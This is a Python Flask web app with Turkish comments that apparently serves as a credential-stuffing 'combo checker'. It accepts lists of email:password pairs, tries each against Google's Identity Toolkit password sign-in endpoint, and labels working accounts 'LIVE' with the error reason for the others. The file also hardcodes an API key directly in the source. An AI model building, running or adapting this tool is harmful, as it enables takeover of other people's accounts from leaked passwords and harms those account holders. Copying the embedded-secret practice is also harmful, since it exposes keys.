import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ANAHTARI DİREKT BURAYA YAZDIM (Vercel ayarlarıyla uğraşma diye)
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    # Google API URL
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    
    try:
        # Gerçek bir tarayıcı gibi gitmesi için header ekledik
        headers = {'Content-Type': 'application/json'}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # Google ne diyor? (Terminalden izlemek için)
        print(f"Sorgulanan: {email} | Durum Kodu: {r.status_code}")
        
        if r.status_code == 200:
            return "LIVE"
        
        # Eğer hata varsa sebebini döndür (INVALID_PASSWORD vb.)
        error_data = r.json()
        return error_data.get('error', {}).get('message', 'DEAD')
        
    except Exception as e:
        return f"SISTEM HATASI: {str(e)}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            parts = line.split(":", 1)
            email, password = parts[0].strip(), parts[1].strip()
            status = check_account(email, password)
            results.append({"account": f"{email}:{password}", "status": status})
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
